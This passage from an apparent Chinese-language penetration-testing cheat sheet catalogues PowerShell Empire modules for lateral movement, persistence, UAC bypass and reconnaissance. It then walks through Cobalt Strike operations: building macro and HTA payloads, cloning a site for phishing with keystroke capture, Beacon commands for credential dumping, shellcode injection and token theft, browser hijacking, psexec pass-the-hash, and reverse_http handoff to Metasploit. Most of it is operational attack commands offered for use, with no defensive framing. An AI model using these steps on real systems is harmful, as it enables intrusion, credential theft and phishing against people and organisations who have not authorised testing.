launcher的xml文件。</td></tr><tr><td>lateral_movement/invoke_psexec</td><td>PsExec横向移动</td></tr><tr><td>lateral_movement/invoke_psremoting</td><td>远程PowerShell横向移动</td></tr><tr><td>lateral_movement/invoke_smbexec</td><td>SMBExec横向移动</td></tr><tr><td>lateral_movement/invoke_sqloscmd</td><td>利用xp_cmdshell横向移动</td></tr><tr><td>lateral_movement/invoke_sshcommand</td><td>利用SSH横向移动</td></tr><tr><td>lateral_movement/invoke_wmi</td><td>利用WMI横向移动</td></tr><tr><td>lateral_movement/invoke_wmi_debugger</td><td>使用WMI将远程机器上的二进制文件的调试器设置为cmd.exe或stager</td></tr><tr><td>lateral_movement/jenkins_script_console</td><td>利用未授权访问的Jenkins脚本控制台横向移动</td></tr><tr><td>lateral_movement/new_gpo_immediate_task</td><td>利用GPO中的计划任务横向移动</td></tr></tbody></table><h4 id="Management（管理）"><a href="#Management（管理）" class="headerlink" title="Management（管理）"></a>Management（管理）</h4><table><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>management/enable_rdp*</td><td>在远程计算机上启用RDP并添加防火墙例外。</td></tr><tr><td>management/disable_rdp*</td><td>在远程计算机上禁用RDP</td></tr><tr><td>management/downgrade_account</td><td>在给定的域帐户上设置可逆加密，然后强制下次用户登录时设置密码。</td></tr><tr><td>management/enable_multi_rdp*</td><td>允许多个用户建立同时的RDP连接。</td></tr><tr><td>management/get_domain_sid</td><td>返回当前指定域的SID</td></tr><tr><td>management/honeyhash*</td><td>将人工凭证注入到LSASS</td></tr><tr><td>management/invoke_script</td><td>运行自定义脚本</td></tr><tr><td>management/lock</td><td>锁定工作站的显示</td></tr><tr><td>management/logoff</td><td>从计算机上注销当前用户（或所有用户）</td></tr><tr><td>management/psinject</td><td>利用Powershell注入Stephen Fewer形成的ReflectivePick，该ReflectivePick在远程过程中从内存执行PS代码</td></tr><tr><td>management/reflective_inject</td><td>利用Powershell注入Stephen Fewer形成的ReflectivePick，该ReflectivePick在远程过程中从内存执行PS代码</td></tr><tr><td>management/restart</td><td>重新启动指定的机器</td></tr><tr><td>management/runas</td><td>绕过GPO路径限制</td></tr><tr><td>management/shinject</td><td>将PIC Shellcode Payload注入目标进程</td></tr><tr><td>management/sid_to_user</td><td>将指定的域sid转换为用户</td></tr><tr><td>management/spawn</td><td>在新的powershell.exe进程中生成新agent</td></tr><tr><td>management/spawnas</td><td>使用指定的登录凭据生成agent</td></tr><tr><td>management/switch_listener</td><td>切换listener</td></tr><tr><td>management/timestomp</td><td>通过’调用Set-MacAttribute执行类似耗时的功能</td></tr><tr><td>management/user_to_sid</td><td>将指定的domain\user转换为domain sid</td></tr><tr><td>management/vnc</td><td>Invoke-Vnc在内存中执行VNC代理并启动反向连接</td></tr><tr><td>management/wdigest_downgrade*</td><td>将计算机上的wdigest设置为使用显式凭据</td></tr><tr><td>management/zipfolder</td><td>压缩目标文件夹以供以后渗透</td></tr><tr><td>management/mailraider/disable_security</td><td>此函数检查ObjectModelGuard</td></tr><tr><td>management/mailraider/get_emailitems</td><td>返回指定文件夹的所有项目</td></tr><tr><td>management/mailraider/get_subfolders</td><td>返回指定顶级文件夹中所有文件夹的列表</td></tr><tr><td>management/mailraider/mail_search</td><td>在给定的Outlook文件夹中搜索项目</td></tr><tr><td>management/mailraider/search_gal</td><td>返回与指定搜索条件匹配的所有exchange users</td></tr><tr><td>management/mailraider/send_mail</td><td>使用自定义或默认模板将电子邮件发送到指定地址。</td></tr><tr><td>management/mailraider/view_email</td><td>选择指定的文件夹，然后在指定的索引处输出电子邮件项目</td></tr></tbody></table><h4 id="Persistence（持久化）"><a href="#Persistence（持久化）" class="headerlink" title="Persistence（持久化）"></a>Persistence（持久化）</h4><table><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>persistence/elevated/registry*</td><td>计算机启动项持久化，通过HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run进行持久化，运行一个stager或者脚本</td></tr><tr><td>persistence/elevated/schtasks*</td><td>计划任务持久化</td></tr><tr><td>persistence/elevated/wmi*</td><td>WMI事件订阅持久化</td></tr><tr><td>persistence/elevated/wmi_updater*</td><td>WMI订阅持久化</td></tr><tr><td>persistence/misc/add_netuser</td><td>将域用户或本地用户添加到当前（或远程）计算机</td></tr><tr><td>persistence/misc/add_sid_history*</td><td>运行PowerSploit的Invoke-Mimikatz函数以执行misc::addsid以添加用户的sid历史记录。 仅适用于域控制器</td></tr><tr><td>persistence/misc/debugger*</td><td>将指定目标二进制文件的调试器设置为cmd.exe</td></tr><tr><td>persistence/misc/disable_machine_acct_change*</td><td>禁止目标系统的机器帐户自动更改其密码</td></tr><tr><td>persistence/misc/get_ssps</td><td>枚举所有已加载的安全软件包</td></tr><tr><td>persistence/misc/install_ssp*</td><td>安装安全支持提供程序dll</td></tr><tr><td>persistence/misc/memssp*</td><td>运行PowerSploit的Invoke-Mimikatz函数以执行misc::memssp，将所有身份验证事件记录到C:\Windows\System32\mimisla.log</td></tr><tr><td>persistence/misc/skeleton_key*</td><td>运行PowerSploit的Invoke-Mimikatz函数来执行misc::skeleton，植入密码mimikatz的万能钥匙。 仅适用于域控制器</td></tr><tr><td>persistence/powerbreach/deaduser</td><td>DeadUserBackdoor后门，详细信息：<a href="http://www.sixdub.net/?p=535">http://www.sixdub.net/?p=535</a></td></tr><tr><td>persistence/powerbreach/eventlog*</td><td>启动事件循环后门</td></tr><tr><td>persistence/powerbreach/resolver</td><td>启动解析器后门</td></tr><tr><td>persistence/userland/backdoor_lnk</td><td>LNK文件后门</td></tr><tr><td>persistence/userland/registry</td><td>计算机启动项持久化，通过HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run进行持久化，运行一个stager或者脚本</td></tr><tr><td>persistence/userland/schtasks</td><td>计划任务持久化</td></tr></tbody></table><h4 id="Privesc（权限提升）"><a href="#Privesc（权限提升）" class="headerlink" title="Privesc（权限提升）"></a>Privesc（权限提升）</h4><table><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>privesc/ask</td><td>弹出一个对话框，询问用户是否要以管理员身份运行powershell</td></tr><tr><td>privesc/bypassuac</td><td>UAC bypass</td></tr><tr><td>privesc/bypassuac_env</td><td>UAC bypass</td></tr><tr><td>privesc/bypassuac_eventvwr</td><td>UAC bypass</td></tr><tr><td>privesc/bypassuac_fodhelper</td><td>UAC bypass</td></tr><tr><td>privesc/bypassuac_sdctlbypass</td><td>UAC bypass</td></tr><tr><td>privesc/bypassuac_tokenmanipulation</td><td>UAC bypass</td></tr><tr><td>privesc/bypassuac_wscript</td><td>UAC bypass</td></tr><tr><td>privesc/getsystem*</td><td>获取system特权</td></tr><tr><td>privesc/gpp</td><td>利用windows组策略首选项缺陷获取系统帐号</td></tr><tr><td>privesc/mcafee_sitelist</td><td>寻找McAfee SiteList.xml文件的纯文本密码</td></tr><tr><td>privesc/ms16-032</td><td>MS16-032本地提权</td></tr><tr><td>privesc/ms16-135</td><td>MS16-135本地提权</td></tr><tr><td>privesc/tater</td><td>利用PowerShell实现的Hot Potato提权</td></tr><tr><td>privesc/powerup/allchecks</td><td>检查目标主机的攻击向量以进行权限提升</td></tr><tr><td>privesc/powerup/find_dllhijack</td><td>查找通用的.DLL劫持</td></tr><tr><td>privesc/powerup/service_exe_restore</td><td>还原备份的服务二进制文件</td></tr><tr><td>privesc/powerup/service_exe_stager</td><td>备份服务的二进制文件，并用启动stager.bat的二进制文件替换原始文件</td></tr><tr><td>privesc/powerup/service_exe_useradd</td><td>修改目标服务以创建本地用户并将其添加到本地管理员</td></tr><tr><td>privesc/powerup/service_stager</td><td>修改目标服务以执行Empire stager</td></tr><tr><td>privesc/powerup/service_useradd</td><td>修改目标服务以创建本地用户并将其添加到本地管理员</td></tr><tr><td>privesc/powerup/write_dllhijacker</td><td>将可劫持的.dll以及.dll调用的stager.bat一起写到指定路径。 wlbsctrl.dll在Windows 7上运行良好。需要重新启动计算机</td></tr></tbody></table><h4 id="Recon（侦察）"><a href="#Recon（侦察）" class="headerlink" title="Recon（侦察）"></a>Recon（侦察）</h4><table><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>recon/find_fruit</td><td>在网络范围内搜索潜在的易受攻击的Web服务</td></tr><tr><td>recon/get_sql_server_login_default_pw</td><td>发现在当前广播域之内的SQL Server实例</td></tr><tr><td>recon/http_login</td><td>针对基本身份验证测试凭据</td></tr></tbody></table><h4 id="Situational-awareness（态势感知）"><a href="#Situational-awareness（态势感知）" class="headerlink" title="Situational_awareness（态势感知）"></a>Situational_awareness（态势感知）</h4><table><thead><tr><th>模块名</th><th></th></tr></thead><tbody><tr><td>situational_awareness/host/antivirusproduct</td><td>获取防病毒产品信息</td></tr><tr><td>situational_awareness/host/computerdetails*</td><td>枚举有关系统的有用信息</td></tr><tr><td>situational_awareness/host/dnsserver</td><td>枚举系统使用的DNS服务器</td></tr><tr><td>situational_awareness/host/findtrusteddocuments</td><td>该模块将枚举适当的注册表</td></tr><tr><td>situational_awareness/host/get_pathacl</td><td>枚举给定文件路径的ACL</td></tr><tr><td>situational_awareness/host/get_proxy</td><td>枚举当前用户的代理服务器和WPAD内容</td></tr><tr><td>situational_awareness/host/get_uaclevel</td><td>枚举UAC级别</td></tr><tr><td>situational_awareness/host/monitortcpconnections</td><td>监视主机与指定域名或IPv4地址的TCP连接，对于会话劫持和查找与敏感服务进行交互的用户很有用</td></tr><tr><td>situational_awareness/host/paranoia*</td><td>持续检查运行过程中是否存在可疑用户</td></tr><tr><td>situational_awareness/host/winenum</td><td>收集有关主机和当前用户上下文的相关信息</td></tr><tr><td>situational_awareness/network/arpscan</td><td>针对给定范围的IPv4 IP地址执行ARP扫描</td></tr><tr><td>situational_awareness/network/bloodhound</td><td>执行BloodHound数据收集</td></tr><tr><td>situational_awareness/network/get_exploitable_system</td><td>查询Active Directory以查找可能容易受到Metasploit Exploit的系统</td></tr><tr><td>situational_awareness/network/get_spn</td><td>获取服务主体名称（SPN）</td></tr><tr><td>situational_awareness/network/get_sql_instance_domain</td><td>返回SQL Server实例列表</td></tr><tr><td>situational_awareness/network/get_sql_server_info</td><td>从目标SQL Server返回基本服务器和用户信息</td></tr><tr><td>situational_awareness/network/portscan</td><td>使用常规套接字进行简单的端口扫描</td></tr><tr><td>situational_awareness/network/reverse_dns</td><td>执行给定IPv4 IP范围的DNS反向查找</td></tr><tr><td>situational_awareness/network/smbautobrute</td><td>针对用户名/密码列表运行SMB暴力破解</td></tr><tr><td>situational_awareness/network/smbscanner</td><td>在多台机器上测试用户名/密码组合</td></tr><tr><td>situational_awareness/network/powerview/find_foreign_group</td><td>枚举给定域的组的所有成员，并查找不在查询域中的用户</td></tr><tr><td>situational_awareness/network/powerview/find_foreign_user</td><td>枚举在其主域之外的组中的用户</td></tr><tr><td>situational_awareness/network/powerview/find_gpo_computer_admin</td><td>获取计算机（或GPO）对象，并确定哪些用户/组对该对象具有管理访问权限</td></tr><tr><td>situational_awareness/network/powerview/find_gpo_location</td><td>获取用户名或组名，并确定其具有通过GPO进行管理访问的计算机</td></tr><tr><td>situational_awareness/network/powerview/find_localadmin_access</td><td>在当前用户具有“本地管理员”访问权限的本地域上查找计算机</td></tr><tr><td>situational_awareness/network/powerview/find_managed_security_group</td><td>此功能检索域中的所有安全组</td></tr><tr><td>situational_awareness/network/powerview/get_cached_rdpconnection</td><td>使用远程注册表功能来查询计算机上“ Windows远程桌面连接客户端”的所有信息</td></tr><tr><td>situational_awareness/network/powerview/get_computer</td><td>查询当前计算机对象的域</td></tr><tr><td>situational_awareness/network/powerview/get_dfs_share</td><td>返回给定域的所有容错分布式文件系统的列表</td></tr><tr><td>situational_awareness/network/powerview/get_domain_controller</td><td>返回当前域或指定域的域控制器</td></tr><tr><td>situational_awareness/network/powerview/get_domain_policy</td><td>返回给定域或域控制器的默认域或DC策略</td></tr><tr><td>situational_awareness/network/powerview/get_domain_trust</td><td>返回当前域或指定域的所有域信任</td></tr><tr><td>situational_awareness/network/powerview/get_fileserver</td><td>返回从用户主目录提取的所有文件服务器的列表</td></tr><tr><td>situational_awareness/network/powerview/get_forest</td><td>返回有关给定域森林的信息</td></tr><tr><td>situational_awareness/network/powerview/get_forest_domain</td><td>返回给定林的所有域</td></tr><tr><td>situational_awareness/network/powerview/get_gpo</td><td>获取域中所有当前GPO的列表</td></tr><tr><td>situational_awareness/network/powerview/get_group</td><td>获取域中所有当前组的列表</td></tr><tr><td>situational_awareness/network/powerview/get_group_member</td><td>返回给定组的成员</td></tr><tr><td>situational_awareness/network/powerview/get_localgroup</td><td>返回本地或远程计算机上指定本地组中所有当前用户的列表</td></tr><tr><td>situational_awareness/network/powerview/get_loggedon</td><td>执行NetWkstaUserEnum Win32API调用以查询主动登录主机的用户</td></tr><tr><td>situational_awareness/network/powerview/get_object_acl</td><td>返回与特定活动目录对象关联的ACL</td></tr><tr><td>situational_awareness/network/powerview/get_ou</td><td>获取域中所有当前OU的列表</td></tr><tr><td>situational_awareness/network/powerview/get_rdp_session</td><td>在给定的RDP远程服务中查询活动会话和原始IP</td></tr><tr><td>situational_awareness/network/powerview/get_session</td><td>执行NetSessionEnum Win32API调用以查询主机上的活动会话</td></tr><tr><td>situational_awareness/network/powerview/get_site</td><td>获取域中所有当前站点的列表</td></tr><tr><td>situational_awareness/network/powerview/get_subnet</td><td>获取域中所有当前子网的列表</td></tr><tr><td>situational_awareness/network/powerview/get_user</td><td>查询给定用户或指定域中用户的信息</td></tr><tr><td>situational_awareness/network/powerview/map_domain_trust</td><td>使用.CSV输出映射所有可访问的域信任</td></tr><tr><td>situational_awareness/network/powerview/process_hunter</td><td>查询远程机器的进程列表</td></tr><tr><td>situational_awareness/network/powerview/set_ad_object</td><td>使用SID，名称或SamAccountName来查询指定的域对象</td></tr><tr><td>situational_awareness/network/powerview/share_finder</td><td>在域中的计算机上查找共享</td></tr><tr><td>situational_awareness/network/powerview/user_hunter</td><td>查找指定组的用户登录的机器</td></tr></tbody></table><h4 id="Trollsploit（恶作剧）"><a href="#Trollsploit（恶作剧）" class="headerlink" title="Trollsploit（恶作剧）"></a>Trollsploit（恶作剧）</h4><table><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>trollsploit/get_schwifty</td><td>播放Schwifty视频，同时把计算机音量设置最大</td></tr><tr><td>trollsploit/message</td><td>发送一个消息框</td></tr><tr><td>trollsploit/process_killer</td><td>终止以特定名称开头的任何进程</td></tr><tr><td>trollsploit/rick_ascii</td><td>生成一个新的powershell.exe进程运行Lee Holmes’ ASCII Rick Roll</td></tr><tr><td>trollsploit/rick_astley</td><td>运行SadProcessor’s beeping rickroll</td></tr><tr><td>trollsploit/thunderstruck</td><td>播放Thunderstruck视频，同时把计算机音量设置最大</td></tr><tr><td>trollsploit/voicetroll</td><td>通过目标上的合成语音朗读文本</td></tr><tr><td>trollsploit/wallpaper</td><td>将.jpg图片上传到目标机器并将其设置为桌面壁纸</td></tr><tr><td>trollsploit/wlmdr</td><td>在任务栏中显示气球提示</td></tr></tbody></table><h4 id="Empire-Word"><a href="#Empire-Word" class="headerlink" title="Empire Word"></a>Empire Word</h4><pre><code>&gt;usestager windows/launcher_bat生成bat木马，设置ListenerWord/Excel-&gt;插入-&gt;对象-&gt;由文件创建，选择bat，显示为图标，修改图标Macro&gt;usestager windows/macro 设置ListenerWord/Excel-&gt;试图-&gt;宏-&gt;创建，复制macro进去</code></pre><h4 id="Empire派生Cobalt-Strike和MSF"><a href="#Empire派生Cobalt-Strike和MSF" class="headerlink" title="Empire派生Cobalt Strike和MSF"></a>Empire派生Cobalt Strike和MSF</h4><h5 id="派生MSF"><a href="#派生MSF" class="headerlink" title="派生MSF"></a>派生MSF</h5><pre><code>可绕过杀软Empire&gt;usemodule code_execution/invoke_shellcode&gt;set Lhost 192.168.0.1&gt;set Lport 4444&gt;set Payload reverse_httpMSF&gt;use exploit/multi/handler&gt;set payloadwindows/meterpreter/reverse_http&gt;set Lhost 192.168.31.247&gt;set lport 4444&gt;run或Empire&gt;usemodule code_execution/invoke_metasploitpayload&gt;set URL http://SRVHOST:SRVPORTMSF#use exploit/multi/script/web_delivery#set payload windows/x64/meterpreter/reverse_tcp设置SRVHOST SRVPORT</code></pre><h5 id="派生Cobalt-Strike-1"><a href="#派生Cobalt-Strike-1" class="headerlink" title="派生Cobalt Strike"></a>派生Cobalt Strike</h5><pre><code>创建监听器/windows/beacon_http/reverse_http 设置端口和主机Empire&gt;usemodule code_execution/invoke_shellcode&gt;set Lhost 192.168.0.1&gt;set Lport 4444&gt;set Payload reverse_http</code></pre><h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><pre><code>需要JDK环境&gt;tar -xzvf jdk-8u191-linux-x64.tar.gz</code></pre><h4 id="部署TeamServer"><a href="#部署TeamServer" class="headerlink" title="部署TeamServer"></a>部署TeamServer</h4><pre><code>&gt;./teamserver 192.168.0.107 123456格式是外网IP和密码</code></pre><h4 id="模块-1"><a href="#模块-1" class="headerlink" title="模块"></a>模块</h4><pre><code>New Connection：新建连接Preferences：设置外观Visualization：查看主机的不同形式VPN Interfaces： VPN接口Listeners：监听器Script Interfaces：查看和加载CNA脚本Close：关闭CS</code></pre><h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><p><img src="./img/212.png" alt="image"></p><h4 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h4><pre><code>创建Cobalt Strike -&gt; Listeners点击Add</code></pre><p><img src="./img/213.png" alt="image"></p><pre><code>Beacon为CS内部监听器。Foreign一般与MSF结合使用。系统架构的支持</code></pre><p><img src="./img/214.png" alt="image"></p><h4 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h4><p><img src="./img/215.png" alt="image"><br>|名称   |功能   |<br>| ———— | ———— |<br>|HTML Application   |基于powershell的.hta格式的HTML Application木马，分为可执行文件、PowerShell、VBA三种方法   |<br>|MS Office Macro  |office宏病毒文件   |<br>|Payload Generator   |基于C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA等语言的payload   |<br>|USB/CD AutoPlay   |利用USB/CD自动播放运行的木马   |<br>|Windows Dropper   |捆绑器   |<br>|Windows Executable   |生成32位或64位的exe和基于服务的可执行文件、DLL等后门   |<br>|Windows Executable(S)   |生成可执行文件，支持powershell脚本，提供代理功能   |</p><pre><code>Web Drive-by基于WEB的攻击模块</code></pre><table><thead><tr><th>名称</th><th>功能</th></tr></thead><tbody><tr><td>Manage</td><td>管理开启的模块</td></tr><tr><td>Clone Site</td><td>克隆网站</td></tr><tr><td>Host File</td><td>提供文件下载</td></tr><tr><td>Scripted Web Delivery</td><td>基于Web的攻击Payload</td></tr><tr><td>Signed Applet Attack</td><td>运行java自签名的攻击模块</td></tr><tr><td>Smart Applet Attack</td><td>自动检测Java版本并利用已知的exploits攻击</td></tr><tr><td>System Profiler</td><td>信息探测模块</td></tr></tbody></table><h4 id="视图模块"><a href="#视图模块" class="headerlink" title="视图模块"></a>视图模块</h4><table><thead><tr><th>Applications</th><th>显示靶机应用信息</th></tr></thead><tbody><tr><td>Credentials</td><td>显示密码(hashdump和mimikatz获取的)</td></tr><tr><td>Downloads</td><td>下载文件</td></tr><tr><td>Event Log</td><td>事件日志</td></tr><tr><td>Keystrokes</td><td>键盘记录</td></tr><tr><td>Proxy Pivots</td><td>代理信息</td></tr><tr><td>Screenshots</td><td>屏幕截图</td></tr><tr><td>Script Console</td><td>加载脚本</td></tr><tr><td>Targets</td><td>查看目标</td></tr><tr><td>Web Log</td><td>查看web日志</td></tr></tbody></table><pre><code>创建powershell脚本</code></pre><p><img src="./img/216.png" alt="image"><br><img src="./img/217.png" alt="image"></p><pre><code>复制脚本到目标机执行即可上线.</code></pre><p><img src="./img/218.png" alt="image"></p><h4 id="交互-1"><a href="#交互-1" class="headerlink" title="交互"></a>交互</h4><pre><code>右键目标机Interact进入交互模式Access    Dump hashes    获取密码Elevate    提权Golden Ticket    黄金票据注入会话Make token    制作令牌Run Mimikatz    运行mimikatzSpawn As    以靶机其他用户权限生成会话Explore    Browser Pivot    劫持浏览器Desktop(VNC)    远程VNCFile Browser    文件管理Net View    执行命令net viewPort scan    端口扫描Process list    进程列表Screenshot    截图Pivoting        SOCKS Server    代理Listener    已获权限的机器当作监听器(反向端口转发)Deploy VPN    部署VPNSpawn    派生会话：联动MSF或Armitage    右键执行mimikatz即可获取hash及明文密码</code></pre><p><img src="./img/219.png" alt="image"></p><pre><code>视图-&gt;凭证信息列出密码，类似empire的creds命令</code></pre><p><img src="./img/220.png" alt="image"></p><h4 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h4><pre><code>argue                     进程参数欺骗blockdlls                  阻止子进程加载非Microsoft DLLbrowserpivot              注入受害者浏览器进程bypassuac                绕过UAC提升权限cancel                    取消正在进行的下载cd                        切换目录checkin                   强制让被控端回连一次clear                     清除beacon内部的任务队列connect                   Connect to a Beacon peer over TCPcovertvpn                 部署Covert VPN客户端cp                        复制文件dcsync                    从DC中提取密码哈希desktop                   远程桌面(VNC)dllinject                   反射DLL注入进程dllload                    使用LoadLibrary将DLL加载到进程中download                 下载文件downloads                列出正在进行的文件下载drives                     列出目标盘符elevate                    使用expexecute                   在目标上执行程序(无输出)execute-assembly         在目标上内存中执行本地.NET程序exit                       终止beacon会话getprivs                   Enable system privileges on current tokengetsystem                 尝试获取SYSTEM权限getuid                     获取用户IDhashdump                  转储密码哈希值help                       帮助inject                      在注入进程生成会话jobkill                     结束一个后台任务jobs                       列出后台任务kerberos_ccache_use       从ccache文件中导入票据应用于此会话kerberos_ticket_purge     清除当前会话的票据kerberos_ticket_use       Apply 从ticket文件中导入票据应用于此会话keylogger                 键盘记录kill                      结束进程link                      Connect to a Beacon peer over a named pipelogonpasswords            使用mimikatz转储凭据和哈希值ls                        列出文件make_token                创建令牌以传递凭据mimikatz                  运行mimikatzmkdir                     创建一个目录mode dns                  使用DNS A作为通信通道(仅限DNS beacon)mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)mode http                 使用HTTP作为通信通道mv                        移动文件net                       net命令note                      备注       portscan                  进行端口扫描powerpick                 通过Unmanaged PowerShell执行命令powershell                通过powershell.exe执行命令powershell-import         导入powershell脚本ppid                      Set parent PID for spawned post-ex jobsps                        显示进程列表psexec                    Use a service to spawn a session on a hostpsexec_psh                Use PowerShell to spawn a session on a hostpsinject                  在特定进程中执行PowerShell命令pth                       使用Mimikatz进行传递哈希pwd                       当前目录位置reg                       Query the registryrev2self                  恢复原始令牌rm                        删除文件或文件夹rportfwd                  端口转发run                       在目标上执行程序(返回输出)runas                     以其他用户权限执行程序runasadmin                在高权限下执行程序runu                      Execute a program under another PIDscreenshot                屏幕截图setenv                    设置环境变量shell                     执行cmd命令shinject                  将shellcode注入进程shspawn                   启动一个进程并将shellcode注入其中sleep                     设置睡眠延迟时间socks                     启动SOCKS4代理socks stop                停止SOCKS4spawn                     Spawn a session spawnas                   Spawn a session as another userspawnto                   Set executable to spawn processes intospawnu                    Spawn a session under another PIDssh                       使用ssh连接远程主机ssh-key                   使用密钥连接远程主机steal_token               从进程中窃取令牌timestomp                 将一个文件的时间戳应用到另一个文件unlink                    Disconnect from parent Beaconupload                    上传文件wdigest                   使用mimikatz转储明文凭据winrm                     使用WinRM横向渗透wmi                       使用WMI横向渗透执行命令，在beacon模式下键入shell+命令</code></pre><p><img src="./img/221.png" alt="image"></p><pre><code>&gt;sleep 0 交互模式，立刻执行命令注入DLL到某个进程&gt;dllload [pid] [c:\path\to\file.dll] DLL需在目标上&gt;kerberos_ticket_purge 清除票据&gt;kerberos_ccache_use    [/path/to/file.ccache]  从ccache文件导入票据&gt;kerberos_ticket_use [/path/to/file.ccache] 从ticket文件导入票据&gt;kill pid 结束进程&gt;timestomp [fileA]    [fileB] 修改文件时间戳&gt;getuid     获取当前用户&gt;steal_token [pid] 窃取进程ID&gt;rev2self 恢复原始令牌&gt;powershell-import    [/path/to/local/script.ps1] 导入PS模块 &gt;shinject [pid] &lt;x86|x64&gt; [/path/to/my.bin] 向进程注入shellcode&gt;socks    port在指定端口开启代理&gt;socks stop停止代理&gt;rportfwd [bind port]    [forward host]    [forward port]开启端口转发</code></pre><h4 id="克隆网站"><a href="#克隆网站" class="headerlink" title="克隆网站"></a>克隆网站</h4><pre><code>Attacks -&gt; Web Drive-by -&gt; System ProfilerRedirect url设置为目标站，登录成功会挑战到真实网站钓鱼攻击-&gt;克隆网站克隆地址写入要克隆的网站Attack选择刚刚收集信息的网站Web日志界面可记录键盘</code></pre><p><img src="./img/222.png" alt="image"></p><pre><code>攻击-&gt;钓鱼攻击管理-&gt;web服务管理中，可kill掉刚刚的任务</code></pre><p><img src="./img/223.png" alt="image"></p><h4 id="office宏"><a href="#office宏" class="headerlink" title="office宏"></a>office宏</h4><p><img src="./img/224.png" alt="image"><br><img src="./img/225.png" alt="image"><br><img src="./img/226.png" alt="image"></p><h4 id="钓鱼邮件-1"><a href="#钓鱼邮件-1" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h4><pre><code>新克隆一个网站</code></pre><p><img src="./img/227.png" alt="image"></p><pre><code>Embed URL选择克隆好的网站</code></pre><p><img src="./img/228.png" alt="image"><br><img src="./img/229.png" alt="image"><br><img src="./img/230.png" alt="image"></p><pre><code>里面的超链接已经被Embed URL克隆好的URL替换掉了</code></pre><p><img src="./img/231.png" alt="image"><br><img src="./img/232.png" alt="image"></p><pre><code>若是要加载附件，需注意附件的免杀</code></pre><h4 id="加载脚本"><a href="#加载脚本" class="headerlink" title="加载脚本"></a>加载脚本</h4><pre><code>https://github.com/rsmudge/ElevateKit 提权脚本&gt;git clone https://github.com/rsmudge/ElevateKit.git&gt;git clone https://github.com/TheKingOfDuck/myScripts.gitCobalt Strike -&gt; Scripts 选择elevate.cna加载提权的EXP列表就会增加已经加入的模块</code></pre><h4 id="浏览器劫持"><a href="#浏览器劫持" class="headerlink" title="浏览器劫持"></a>浏览器劫持</h4><pre><code>beacon 设为交互模式beacon&gt; sleep 0[Beacon] → Explore → Browser Pivot选择打对勾的注入，会返回一个proxy，服务器IP+端口&gt;chromium --no-sandbox --ignore-certificate-errors --proxy-server=服务器IP:端口访问网址</code></pre><h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><pre><code>https://github.com/DeEpinGh0st/Erebus加载 cna 脚本Cobalt Strike → Script Manager → Load → Erebus 中的 Main.cna生成 PayloadAttacks → Packages→ Windows Executable(S)Erebus → Persistence选择维持方法</code></pre><h4 id="横向-1"><a href="#横向-1" class="headerlink" title="横向"></a>横向</h4><pre><code>扫描存活主机&gt;portscan ip/网段 ports端口 扫描协议(arp、icmp、none) 线程&gt;portscan 192.168.1.0/24 445 arp 100或右键目标&gt;扫描点击工具栏的View–&gt;Targets，查看端口探测后的存活主机。（Targets可自行添加）Login-&gt;psexec进行hash传递登录</code></pre><h4 id="隔离网络"><a href="#隔离网络" class="headerlink" title="隔离网络"></a>隔离网络</h4><h5 id="权限机中转"><a href="#权限机中转" class="headerlink" title="权限机中转"></a>权限机中转</h5><pre><code>Pivoting -&gt;Listener新建一条已有权限机器的监听器</code></pre><p><img src="./img/233.png" alt="image"><br><img src="./img/234.png" alt="image"><br><img src="./img/235.png" alt="image"></p><pre><code>选择 Attacks-&gt;Packages-&gt;Windows Executable(Stageless) </code></pre><p><img src="./img/236.png" alt="image"></p><pre><code>上传生成的payload到已上线的目标机中，上传PsExec.exebeacon&gt;shell C:\psexec.exe -accepteula \\10.1.1.105 -u administrator -p xxx -d -c C:\beacon.exe</code></pre><p><img src="./img/237.png" alt="image"></p><h5 id="SMB-beacon"><a href="#SMB-beacon" class="headerlink" title="SMB_beacon"></a>SMB_beacon</h5><pre><code>新建监听器(bind)windows/beacon_smb/bind_pipe执行&gt;psexec 机器名 ADMIN$/c$ bind</code></pre><h5 id="SSH-login"><a href="#SSH-login" class="headerlink" title="SSH login"></a>SSH login</h5><pre><code>&gt;ssh 10.1.1.98:22 root admin</code></pre><p><img src="./img/238.png" alt="image"></p><h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><pre><code>&gt;socks 690视图-&gt;代理信息-tunnel 直接复制，粘贴到MSF中</code></pre><h4 id="部署VPN"><a href="#部署VPN" class="headerlink" title="部署VPN"></a>部署VPN</h4><p><img src="./img/239.png" alt="image"></p><pre><code>选择内网网卡</code></pre><p><img src="./img/240.png" alt="image"><br><img src="./img/241.png" alt="image"><br><img src="./img/242.png" alt="image"></p><pre><code>添加</code></pre><p><img src="./img/243.png" alt="image"><br><img src="./img/244.png" alt="image"><br><img src="./img/245.png" alt="image"></p><pre><code>删除</code></pre><p><img src="./img/246.png" alt="image"></p><h4 id="Cobalt-strike派生-Empire和MSF"><a href="#Cobalt-strike派生-Empire和MSF" class="headerlink" title="Cobalt strike派生 Empire和MSF"></a>Cobalt strike派生 Empire和MSF</h4><h5 id="派生Empire-1"><a href="#派生Empire-1" class="headerlink" title="派生Empire"></a>派生Empire</h5><pre><code>创建一个Listener创建一个stager&gt;usestager windows/shellcode 执行，会生成/tmp/launcher.binCS 使用PS命令查找进程，进行进程注入(&gt;shinject 进程id x64)，选择launcher.bin即可</code></pre><h5 id="派生MSF-1"><a href="#派生MSF-1" class="headerlink" 